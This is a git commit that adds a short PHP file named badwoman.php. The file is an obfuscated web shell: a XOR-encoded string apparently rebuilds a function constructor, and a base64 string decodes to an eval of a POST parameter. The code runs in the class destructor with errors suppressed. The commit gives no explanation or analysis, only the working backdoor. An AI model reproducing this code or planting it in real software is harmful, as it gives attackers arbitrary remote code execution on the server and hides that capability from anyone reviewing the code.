1e1542e9a7f7741f5d920687438893cf2a4b0b6f
Angela576 <64119430+Angela576@users.noreply.github.com>
2020-04-29 18:02:40 +0800

    Create badwoman.php

---
+++ badwoman.php
@@ -0,0 +1,11 @@
+<?php
+class SBLA{
+    function __destruct(){
+        $DBCK='b~s`kpY%cqREox*'^"\x1\xc\x16\x1\x1f\x15\x6\x43\x16\x1f\x31\x31\x6\x17\x44";
+        @$DBCK=$DBCK('',$this->LKFE);
+        return @$DBCK();
+    }
+}
+$sbla=new SBLA();
+@$sbla->LKFE=base64_decode("IEBldmFsKCRfUE9TVFsnSWFtYXNlY3VyaXR5Z3VhcmQnXSk7");
+?>
